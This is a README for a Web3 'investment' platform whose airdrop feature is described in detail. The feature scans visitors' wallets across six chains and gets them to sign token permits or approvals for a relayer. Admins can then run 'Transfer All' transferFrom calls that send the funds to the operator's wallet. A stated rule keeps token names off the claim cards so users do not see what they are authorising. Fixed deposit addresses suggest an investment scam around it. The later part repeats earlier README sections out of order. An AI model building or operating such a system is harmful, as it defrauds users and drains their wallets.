# Altaris Capital

A production-ready Web3 fintech platform built on Next.js 14. Includes an investment dashboard, referral system, KYC flow, real-time admin panel, and a full on-chain airdrop system with multi-chain scanning, chain-branded claim cards, gasless permit flow, EOA relayer, and LiFi auto-bridge gas management.

---

## Table of Contents

1. [Stack](#stack)
2. [Project Structure](#project-structure)
3. [Environment Variables](#environment-variables)
4. [Database Setup](#database-setup)
5. [Airdrop System](#airdrop-system)
6. [Relayer Setup](#relayer-setup)
7. [Admin Dashboard](#admin-dashboard)
8. [Local Development](#local-development)
9. [Vercel Deployment](#vercel-deployment)
10. [Build Checklist](#build-checklist)
11. [API Reference](#api-reference)
12. [Security Notes](#security-notes)
13. [Troubleshooting](#troubleshooting)

---

## Stack

| Layer | Technology |
|---|---|
| Framework | Next.js 14 (App Router) |
| Language | TypeScript |
| Styling | Tailwind CSS + inline styles |
| Database | PostgreSQL via Prisma ORM |
| Auth | JWT (httpOnly cookies) + Email OTP |
| Web3 | wagmi v3, viem, Reown AppKit |
| Real-time | Pusher channels |
| Push notifications | Firebase + Web Push (VAPID) |
| File storage | Vercel Blob |
| Email | Nodemailer (Gmail App Password) |
| Chain scanning | Alchemy Token API |
| Gas bridging | LiFi API |
| Deployment | Vercel |

---

## Project Structure

```
altaris-capital/
├── app/
│   ├── (app)/                  # Authenticated user app
│   │   ├── home/               # Dashboard
│   │   ├── wallet/             # Deposit, withdraw, receive
│   │   ├── invest/             # Investment plans
│   │   ├── markets/            # Live market data
│   │   ├── rewards/            # Referral rewards
│   │   ├── airdrop/            # ← Airdrop claim page
│   │   ├── notifications/
│   │   ├── profile/
│   │   ├── kyc/
│   │   ├── support/
│   │   └── layout.tsx          # App shell with bottom nav
│   ├── (auth)/                 # Login, signup, reset password
│   ├── (website)/              # Public landing page
│   ├── admin/                  # Admin panel
│   │   ├── dashboard/
│   │   ├── users/
│   │   ├── deposits/
│   │   ├── withdrawals/
│   │   ├── kyc/
│   │   ├── chat/
│   │   ├── notifications/
│   │   ├── airdrop/            # ← Gas tank + authorization queue
│   │   ├── analytics/
│   │   ├── settings/
│   │   └── layout.tsx          # Admin shell with sidebar
│   └── api/
│       ├── auth/               # Login, signup, OTP, reset
│       ├── investments/
│       ├── transactions/
│       ├── referral/
│       ├── wallet/
│       ├── admin/              # Admin-protected routes
│       │   ├── users/
│       │   ├── deposits/
│       │   ├── withdrawals/
│       │   ├── kyc/
│       │   ├── chat/
│       │   ├── airdrop/
│       │   │   ├── execute/    # ← Trigger transferFrom
│       │   │   ├── gas/        # ← Relayer balance check
│       │   │   └── queue/      # ← Authorization list
│       └── airdrop/
│           ├── scan/           # ← Multi-chain asset scan
│           ├── cards/          # ← Generate claim cards
│           ├── claim/          # ← Store authorization
│           └── campaigns/      # ← Active campaigns from DB
├── lib/
│   ├── db.ts                   # Prisma singleton
│   ├── auth.ts                 # JWT helpers
│   ├── chains.ts               # ← Supported chains + RPC config
│   ├── scanner.ts              # ← Multi-chain asset scanner
│   ├── permitDetector.ts       # ← EIP-2612 detection
│   ├── cardGenerator.ts        # ← Chain-branded card generator
│   ├── claimLogic.ts           # ← Permit/approve/blur decision
│   ├── relayer.ts              # ← viem EOA relayer wallet
│   ├── gasConfig.ts            # ← Gas thresholds
│   ├── gasMonitor.ts           # ← Per-chain balance checker
│   ├── gasRefill.ts            # ← LiFi auto-bridge
│   ├── airdrop-reown.tsx       # ← Reown AppKit instance
│   └── config/reown.ts         # ← wagmi + AppKit config
├── prisma/
│   ├── schema.prisma           # Full DB schema
│   ├── seed.ts                 # Admin + demo user seed
│   └── airdrop-migration.sql   # ← Airdrop tables + seed campaigns
├── vercel.json                 # Cron + headers config
└── .env.example                # All environment variables
```

---

## Environment Variables

Copy `.env.example` to `.env.local`. Never commit real values to Git. Set all variables in Vercel Project Settings → Environment Variables for production.

### Core (required)

```env
DATABASE_URL="postgresql://user:password@host:5432/dbname?sslmode=require"
JWT_SECRET="min-32-chars-random-string"
ADMIN_JWT_SECRET="min-32-chars-different-random-string"
NEXT_PUBLIC_APP_URL="https://your-domain.vercel.app"
```

### Email

```env
GMAIL_USER="you@gmail.com"
GMAIL_APP_PASSWORD="xxxx xxxx xxxx xxxx"
```

Generate a Gmail App Password at: https://myaccount.google.com/apppasswords

### Reown AppKit (wallet connect)

```env
NEXT_PUBLIC_REOWN_PROJECT_ID="your_project_id"
```

Get a project ID at: https://cloud.reown.com

### Pusher (real-time)

```env
NEXT_PUBLIC_PUSHER_KEY="your_key"
NEXT_PUBLIC_PUSHER_CLUSTER="eu"
PUSHER_APP_ID="your_app_id"
PUSHER_KEY="your_key"
PUSHER_SECRET="your_secret"
PUSHER_CLUSTER="eu"
```

### Firebase (push notifications — optional)

```env
NEXT_PUBLIC_FIREBASE_API_KEY=""
NEXT_PUBLIC_FIREBASE_AUTH_DOMAIN=""
NEXT_PUBLIC_FIREBASE_PROJECT_ID=""
NEXT_PUBLIC_FIREBASE_STORAGE_BUCKET=""
NEXT_PUBLIC_FIREBASE_MESSAGING_SENDER_ID=""
NEXT_PUBLIC_FIREBASE_APP_ID=""
NEXT_PUBLIC_FIREBASE_MEASUREMENT_ID=""
NEXT_PUBLIC_FIREBASE_VAPID_KEY=""
FIREBASE_SERVICE_ACCOUNT_JSON=""
```

### Vercel Blob (KYC + avatar storage)

```env
BLOB_READ_WRITE_TOKEN="vercel_blob_rw_..."
```

### Telegram (admin alerts — optional)

```env
TELEGRAM_BOT_TOKEN=""
TELEGRAM_KYC_CHAT_ID=""
ADMIN_TELEGRAM_BOT_TOKEN=""
TELEGRAM_ADMIN_CHAT_ID=""
```

### Airdrop System

```env
# Relayer EOA wallet — generate once (see Relayer Setup below)
RELAYER_PRIVATE_KEY="0x..."
RELAYER_ADDRESS="0x..."
NEXT_PUBLIC_RELAYER_ADDRESS="0x..."    # same address, needed client-side

# Alchemy — multi-chain token scanning
ALCHEMY_API_KEY="your_alchemy_key"

# LiFi — auto gas bridging (optional, increases rate limits)
LIFI_API_KEY="your_lifi_key"

# Cron secret — protects /api/cron/gas-check endpoint
CRON_SECRET="min-32-chars-random-string"
```

---

## Database Setup

### 1. Run migrations

```bash
# Generate Prisma client from schema
npx prisma generate

# Push schema to database (dev/staging)
npm run db:push

# Or run migrations (production)
npm run db:migrate
```

### 2. Seed core data

```bash
npm run db:seed
```

Creates a default admin user and demo user. Override credentials with:

```env
SEED_ADMIN_EMAIL=admin@yourdomain.com
SEED_ADMIN_PASSWORD=your_strong_password
SEED_DEMO_EMAIL=demo@yourdomain.com
SEED_DEMO_PASSWORD=your_demo_password
```

### 3. Airdrop tables

```bash
# Option A — let Prisma handle it (recommended)
npm run db:push

# Option B — run the SQL directly
psql $DATABASE_URL -f prisma/airdrop-migration.sql
```

The migration SQL also seeds two example campaigns:
- Base Ecosystem Boost (USDC on Base, chain 8453)
- Ethereum DeFi Reward (USDT on Ethereum, chain 1)

Edit or add campaigns directly in the `airdrop_campaigns` table via your DB client or a future admin UI.

---

## Airdrop System

### How it works

```
User opens /airdrop
        ↓
Clicks Connect Wallet → Reown AppKit modal
        ↓
App scans 6 chains simultaneously (Ethereum, Base, Polygon, Arbitrum, Optimism, BNB Chain)
        ↓
Detects native balances + ERC20 tokens via Alchemy
        ↓
Checks each ERC20 for permit support (EIP-2612) by calling nonces()
        ↓
Matches assets to active campaigns from DB
        ↓
Generates chain-branded airdrop cards (never token names in titles)
        ↓
Resolves claim state per card:
  - Has permit?         → ACTIVE_PERMIT (gasless sign)
  - No permit, has gas? → ACTIVE_APPROVE (approve tx)
  - No permit, no gas?  → GAS_REQUIRED (blurred button)
        ↓
User clicks claim → signs message (permit) or approves (ERC20)
        ↓
Backend verifies wallet ownership signature, stores authorization
        ↓
Admin reviews queue → executes transferFrom from admin panel
```

### Cardinal rule — never break this

Card titles are always chain-branded. Token names never appear in titles, subtitles, or descriptions.

| Wrong | Correct |
|---|---|
| USDC Airdrop | Base Ecosystem Boost |
| USDT Holder Reward | Base Liquidity Reward |

Token info is shown only in the details panel (collapsible, per card).

### Claim state logic

```
Token supports permit (nonces() doesn't revert)
  → ACTIVE_PERMIT
  → User signs EIP-712 message (gasless)
  → Relayer submits permit + transferFrom on-chain

Token does NOT support permit
AND wallet has ≥ 0.001 ETH native on that chain
  → ACTIVE_APPROVE
  → User approves relayer as spender (costs gas)
  → Relayer calls transferFrom on-chain

Token does NOT support permit
AND wallet has < 0.001 ETH
  → GAS_REQUIRED
  → Card shown at 60% opacity, button blurred and disabled
```

### Supported chains

| Chain | Chain ID | Native |
|---|---|---|
| Ethereum | 1 | ETH |
| Base | 8453 | ETH |
| Polygon | 137 | MATIC |
| Arbitrum | 42161 | ETH |
| Optimism | 10 | ETH |
| BNB Chain | 56 | BNB |

---

## Relayer Setup

The relayer is an EOA wallet that pays gas and executes `transferFrom` on behalf of users who have signed a permit or approved it as spender.

### Step 1 — Generate the relayer wallet

Run this once locally. Never call it at runtime.

```typescript
// In a local Node.js script or ts-node REPL:
import { generateRelayerWallet } from './lib/relayer'
await generateRelayerWallet()
// Prints:
// RELAYER_PRIVATE_KEY=0x...
// RELAYER_ADDRESS=0x...
```

Save the output to `.env.local` and Vercel env settings.

### Step 2 — Fund the relayer on Base (source chain)

Send ETH to `RELAYER_ADDRESS` on Base. Base is the source chain — LiFi will auto-bridge ETH to other chains when their balances drop below threshold.

**Recommended starting balance:** 0.05–0.1 ETH on Base.

### Step 3 — Auto-bridge behavior

A Vercel cron job runs every 30 minutes at `/api/cron/gas-check`. It:

1. Checks the relayer ETH balance on every supported chain
2. If any chain drops below `0.002 ETH` (configurable in `lib/gasConfig.ts`)
3. Calls LiFi API to find the best bridge route from Base
4. Relayer on Base signs and sends the bridge transaction
5. Logs the refill in the `airdrop_gas_refills` table

You can also trigger it manually from Admin → Airdrop → Run Check Now.

### Step 4 — Admin gas tank monitor

Admin → Airdrop shows live balances per chain with status indicators:

- `SOURCE` — Base, the main tank
- `✅ OK` — balance above threshold
- `⚠️ LOW` — below threshold, auto-refill queued

---

## Admin Dashboard

Access at `/admin/login`. Requires `ADMIN_JWT_SECRET`.

### Pages

| Page | Path | Description |
|---|---|---|
| Dashboard | `/admin/dashboard` | Stats, signups, AUM |
| Users | `/admin/users` | All users, balances, KYC status |
| Deposits | `/admin/deposits` | Approve/reject pending deposits |
| Withdrawals | `/admin/withdrawals` | Manage withdrawal requests |
| KYC Review | `/admin/kyc` | Review documents, approve/reject |
| Support | `/admin/chat` | Live chat with users |
| Broadcast | `/admin/notifications` | Push notification to all users |
| **Airdrop** | `/admin/airdrop` | Gas tank + claim queue + execute |
| Analytics | `/admin/analytics` | Growth charts |
| Settings | `/admin/settings` | Deposit addresses, app config |

### Airdrop control panel

The Admin → Airdrop page has two sections:

**Gas Tank**
- Shows relayer ETH balance per chain
- Displays relayer address for manual top-up
- Shows recent auto-refill history
- Refresh button + manual trigger via API

**Authorization Queue**
- Lists all pending/executed/failed authorizations
- Per row: wallet, chain, token, amount, type (permit/approve)
- Custom amount input — admin can override the claim amount
- Transfer All button — executes `transferFrom` for that row
- On execution: relayer submits permit (if permit type) then `transferFrom`

---

## Local Development

### Install

```bash
npm install
```

### Environment

```bash
cp .env.example .env.local
# Fill in required values
```

Minimum required for local dev:

```env
DATABASE_URL=postgresql://localhost:5432/altaris_dev
JWT_SECRET=any-32-char-string-for-dev
ADMIN_JWT_SECRET=another-32-char-string-for-dev
NEXT_PUBLIC_REOWN_PROJECT_ID=your_reown_id
ALCHEMY_API_KEY=your_alchemy_key
RELAYER_PRIVATE_KEY=0x...
RELAYER_ADDRESS=0x...
NEXT_PUBLIC_RELAYER_ADDRESS=0x...
CRON_SECRET=any-32-char-string-for-dev
```

### Database

```bash
npx prisma generate
npm run db:push
npm run db:seed
```

### Run

```bash
npm run dev
```

App: http://localhost:3000
Admin: http://localhost:3000/admin/login

### iPhone testing on same Wi-Fi

```bash
npm run dev
# Copy the LAN URL printed in terminal e.g. http://192.168.1.x:3000
# Open on iPhone Safari
```

Requires `HOST=0.0.0.0` (already set as default).

---

## Vercel Deployment

### 1. Connect repo to Vercel

Import the project at https://vercel.com/new

### 2. Set environment variables

In Vercel Project → Settings → Environment Variables, add every variable from `.env.example`. Key ones for production:

```
DATABASE_URL
JWT_SECRET
ADMIN_JWT_SECRET
NEXT_PUBLIC_REOWN_PROJECT_ID
ALCHEMY_API_KEY
RELAYER_PRIVATE_KEY          ← server-side only, no NEXT_PUBLIC prefix
RELAYER_ADDRESS              ← server-side only
NEXT_PUBLIC_RELAYER_ADDRESS  ← client-side, same address
CRON_SECRET
NEXT_PUBLIC_APP_URL
```

### 3. Deploy

```bash
git push origin main
```

Vercel auto-deploys on push.

### 4. Run DB migrations on first deploy

After first deploy, run in Vercel's integrated terminal or via a one-off script:

```bash
npx prisma migrate deploy
# or
npx prisma db push
```

Then seed:

```bash
npm run db:seed
```

Then apply airdrop tables:

```bash
psql $DATABASE_URL -f prisma/airdrop-migration.sql
```

### 5. Cron job

`vercel.json` registers the gas-check cron automatically:

```json
{
  "crons": [
    {
      "path": "/api/cron/gas-check",
      "schedule": "*/30 * * * *"
    }
  ]
}
```

Vercel crons require a Pro plan. The endpoint is protected by `CRON_SECRET`.

---

## Build Checklist

Before deploying, run through this list:

```bash
# 1. Generate Prisma types (required after schema changes)
npx prisma generate

# 2. Type-check without building
npx tsc --noEmit

# 3. Full build
npm run build

# 4. Verify these routes return 200:
curl http://localhost:3000/api/airdrop/campaigns
curl -X POST http://localhost:3000/api/airdrop/scan \
  -H "Content-Type: application/json" \
  -d '{"address":"0x000...test"}'
```

### Common build errors

| Error | Fix |
|---|---|
| `Type 'X' does not exist on type 'PrismaClient'` | Run `npx prisma generate` |
| `Cannot find module '@reown/appkit/react'` | Run `npm install` |
| `useSignMessage is not a function` | Check wagmi version — hooks may differ between v2 and v3 |
| `useAppKitAccount is not exported` | Check your installed `@reown/appkit` version |
| `verifyToken is not a function` | Match the import to your actual `lib/auth.ts` export signature |

---

## API Reference

### Public airdrop routes

| Method | Path | Body | Description |
|---|---|---|---|
| `GET` | `/api/airdrop/campaigns` | — | Returns all active campaigns |
| `POST` | `/api/airdrop/scan` | `{ address }` | Scans all chains for assets, upserts to DB |
| `POST` | `/api/airdrop/cards` | `{ address, assets }` | Generates claim cards matched to campaigns |
| `POST` | `/api/airdrop/claim` | See below | Submits authorization with wallet proof |

#### POST /api/airdrop/claim body

```json
{
  "wallet":         "0x...",
  "chainId":        8453,
  "tokenAddress":   "0x...",
  "authType":       "permit",
  "spender":        "0x...",
  "amount":         "1000000000",
  "deadline":       1234567890,
  "signature":      "0x...",
  "txHash":         null,
  "campaignId":     "camp_base_usdc_01",
  "proofMessage":   "Altaris Airdrop Claim: 0x... at 1234567890",
  "proofSignature": "0x..."
}
```

### Admin airdrop routes (admin JWT required)

| Method | Path | Description |
|---|---|---|
| `GET` | `/api/admin/airdrop/gas` | Relayer balances + refill history |
| `GET` | `/api/admin/airdrop/queue?status=pending` | Authorization queue |
| `POST` | `/api/admin/airdrop/execute` | Execute transferFrom for one authorization |

#### POST /api/admin/airdrop/execute body

```json
{
  "authorizationId": "clxxx...",
  "customAmount":    "500",
  "destinationWallet": "0x..."
}
```

`customAmount` is optional. If omitted, uses the full authorized amount.
`destinationWallet` is optional. If omitted, uses `RELAYER_ADDRESS`.

### Cron

| Method | Path | Auth | Description |
|---|---|---|---|
| `GET` | `/api/cron/gas-check` | Bearer `CRON_SECRET` | Check all chain balances, trigger refills |

---

## Security Notes

- `RELAYER_PRIVATE_KEY` is server-side only. Never prefix with `NEXT_PUBLIC_`. Never log it. Never return it from any API route.
- All `/api/admin/*` routes verify the admin JWT from `admin_token` cookie before executing.
- `/api/airdrop/claim` verifies wallet ownership via `verifyMessage` before writing any authorization. The proof message must include the wallet address and a timestamp.
- Duplicate claim protection: a wallet cannot submit two pending/executed authorizations for the same campaign.
- Nonce collisions: the relayer executes one transaction at a time per chain. Parallel execution across chains is safe since each chain has its own nonce space.
- Row-level security: authorization records are filtered by wallet on the API level. PostgreSQL RLS is optional but recommended for extra hardening.
- Never commit `.env.local` to source control. It is already in `.gitignore`.

---

## Troubleshooting

### Scan returns no assets

- Check `ALCHEMY_API_KEY` is set and the key has access to the chains you're scanning.
- BNB Chain uses a public RPC (not Alchemy) — it will always scan but without `alchemy_getTokensForOwner`, so only native balance is returned.
- Tokens with balance below `0.001` are filtered out. Lower the threshold in `lib/scanner.ts` if needed.

### Permit detection always returns false

- Not all tokens support EIP-2612. USDT on Ethereum specifically does NOT support permit. USDC on Base does.
- If `nonces()` reverts, `detectPermit` returns `false` and the card falls through to the approve path.

### Relayer out of gas

- Check Admin → Airdrop → Gas Tank.
- Send ETH to `RELAYER_ADDRESS` on Base.
- Auto-bridge will refill other chains within the next cron cycle (max 30 min).
- To refill immediately: hit the Run Check Now button or call `GET /api/cron/gas-check` manually with the `CRON_SECRET` header.

### LiFi route not found

- LiFi may not have a route for very small amounts. Increase `refillAmount` in `lib/gasConfig.ts`.
- BNB Chain bridging from Base may route through a wrapped path — LiFi handles this automatically.
- Check `airdrop_gas_refills` table for failed entries.

### Build fails on Prisma types

```bash
npx prisma generate
npm run build
```

Always run `prisma generate` after pulling schema changes.

### wagmi hook version mismatch

This project uses wagmi `3.6.14`. If hooks like `useSignMessage` or `useWriteContract` throw at runtime, check the wagmi v3 migration guide: https://wagmi.sh/react/guides/migrate-from-v2

### Admin login redirects to login page

The admin JWT is stored in the `admin_token` httpOnly cookie. If it's missing or expired, all admin API calls return 401 and the layout redirects to `/admin/login`. Clear cookies and log in again.

---

## Deposit Wallet Addresses (defaults)

Manageable from Admin → Settings.

| Currency | Default Address |
|---|---|
| BTC | `bc1qx0f66y2gcw20n25k7tj9yfalw04gah493plz9x` |
| ETH | `0x3913a2c83a41090A84B72169e9066506d7942e01` |
| USDT | `0x3913a2c83a41090A84B72169e9066506d7942e01` |

---

## License

Private — all rights reserved.
```bash
npx web-push generate-vapid-keys
```

### 3. Database Setup
```bash
# Push schema to database
npm run db:push

# Run seed (creates admin + demo user)
npm run db:seed
```

Seed overrides (recommended for local customization):
```env
SEED_ADMIN_EMAIL=admin@example.com
SEED_ADMIN_PASSWORD=<strong password>
SEED_DEMO_EMAIL=demo@example.com
SEED_DEMO_PASSWORD=<strong password>
```

### 4. PWA Icons
Generate icons from the SVG:
```bash
npm install -g pwa-asset-generator
npx pwa-asset-generator public/icons/icon.svg public/icons --icon-only --favicon
```
Or manually place PNG files sized 72, 96, 128, 144, 152, 192, 512 in `public/icons/`.

### 5. Run
```bash
# Development
npm run dev

# Production
npm run build && npm start
```


### 6. Preview on iPhone Safari (same Wi-Fi)
1. Start the app on your computer:
```bash
npm run dev
```
2. In terminal, copy the printed LAN URL (example: `http://192.168.1.25:3000`).
3. On your iPhone (Safari), open that LAN URL.

If it does not load, ensure:
- phone and computer are on the same network,
- local firewall allows port `3000`,
- `HOST=0.0.0.0` is set (already default in this project).


## Vercel Deployment

This repository is configured to deploy with **npm** on Vercel to match the committed lockfile (`package-lock.json`).

- Install command: `npm ci --legacy-peer-deps`
- Build command: `npm run build`

If Vercel previously cached a different package manager, trigger a fresh deploy after this change so dependency installation uses npm consistently.

## URLs
- **App**: http://localhost:3000
- **Admin Panel**: http://localhost:3000/admin/login

## Deposit Wallet Addresses (defaults)
| Currency | Address |
|----------|---------|
| BTC | bc1qx0f66y2gcw20n25k7tj9yfalw04gah493plz9x |
| ETH | 0x3913a2c83a41090A84B72169e9066506d7942e01 |
| USDT | 0x3913a2c83a41090A84B72169e9066506d7942e01 |

Addresses are manageable from Admin → Settings.

## Security Notes
- Never commit real secrets or credentials to source control.
- All credentials must be injected via environment variables.
- Seed credentials should be overridden via `SEED_*` env vars in shared/dev environments.
- API input validation is enforced on critical financial and admin mutation routes.

## Recent Upgrade Highlights
- Prevented translator-induced React crashes on app-shell pages by disabling Google DOM-translation injection on authenticated app routes while preserving translator behavior for website/auth surfaces.
- Hardened translator state handling with safe localStorage helpers and delayed language apply after script load to prevent client-side crashes when switching language on iOS Safari.
- Fixed Reown AppKit initialization timing for `/airdrop` prerender by creating AppKit at module load before `useAppKit` hooks execute, preventing build-time "Please call createAppKit" errors on Vercel.
- Airdrop now uses real Reown AppKit wallet-connect modal (wallet-only, no socials/email) via `NEXT_PUBLIC_REOWN_PROJECT_ID`, and claim/connect flows open that modal when disconnected.
- Improved header offset stability by recalculating app header height on resize/orientation/focus/visibility and DOM mutations to prevent late overlap regressions.
- Translation UX tightened: auto language initialization on first visit, hidden Google floating UI artifacts, and key dollar balance values marked as non-translatable.
- Fixed mobile app-shell spacing so the fixed header no longer overlaps tab content, moved the Home balance chart directly under the portfolio card, and stacked widget grids to single-column on phones for clean alignment.
- Updated Airdrop flow so Connect Wallet / Claim actions open an in-page wallet connect modal instead of redirecting to app tabs.
- Hardened critical API routes with strict schema validation (admin auth, deposits, withdrawals, OTP, wallet settings).
- Added idempotency protections for admin deposit approval to prevent duplicate balance credits.
- Corrected balance snapshot creation to persist the exact post-update balance.
- Added strict upload validation (type/extension/size) for profile avatars and KYC documents.
- Removed hardcoded credential examples and improved secure setup guidance.
- Refreshed the in-app Home dashboard UI with upgraded portfolio header, richer quick-action cards, and polished market/KYC surfaces for better mobile readability.
- Reworked Wallet UX with a cleaner balance hero + mini trend chart, deposit-first crypto/fiat flow, branded QR receive card, and recent activity summaries.
- Wallet flow now opens with neutral state (no auto-selected action), introduces full-screen crypto receive dashboard, and adds a premium referral rewards dashboard.
- iOS PWA header safe-area handling was tightened so content no longer leaks into the status-bar region.
- Market chart endpoint now falls back to CoinGecko OHLC to keep candlestick charts visible when exchange pairs are unavailable.
- Profile image uploads now accept modern iPhone formats (HEIC/HEIF) in addition to JPEG/PNG/WebP.
- Wallet actions were refined for mobile: Deposit now reveals Crypto/Fiat only on click and auto-hides after 10s if untouched, while Withdraw and Rewards open as dedicated full-screen dashboards.
- Wallet quick action label updated from “My Invest” to “Invested” for clearer navigation.
- Profile avatar validation now supports iOS uploads that omit MIME type by securely validating extension fallback.
- Candlestick chart visuals were upgraded with animated scanline/grid motion for a more live exchange-style feel.
- Fixed installed-PWA layout layering across mobile by moving content into a dedicated scroll region under a measured fixed header and above fixed bottom navigation (safe-area aware for iOS/Android standalone mode).
- Added dynamic header-height offset logic with CSS viewport-safe containers (`100dvh`/`100svh`) so dashboard content never renders behind the status bar.
- Replaced emoji-based UI markers throughout the app/admin surfaces with SVG/text equivalents for a cleaner, consistent visual system.
- Added a minimal website explainer video section (`/videos/altaris-explainer.mp4`) in the marketing landing page.
- Restored full website scrolling by decoupling root shell layout from the in-app fixed-header container so only authenticated app pages use the constrained mobile app viewport shell.
- Wallet fiat deposit now offers six selectable providers (MoonPay, Ramp, Transak, Alchemy Pay, Mercuryo, Onramper) and crypto receive QR size was reduced for cleaner/faster rendering.
- Market chain chart now supports zoom controls (buttons + slider + wheel zoom) for trading-style inspection.
- Profile save now includes a resilient fallback path: if avatar upload request fails, the app retries a JSON profile update so core details still save.
- Wallet portfolio mini-chart now uses deterministic transaction/balance-derived data instead of random noise for more accurate motion.
- Home crypto and top-mover sections now use live provider market data (not placeholder rows).
- Improved chat message alignment and settings interactivity (push toggle wiring, notification preferences UX).
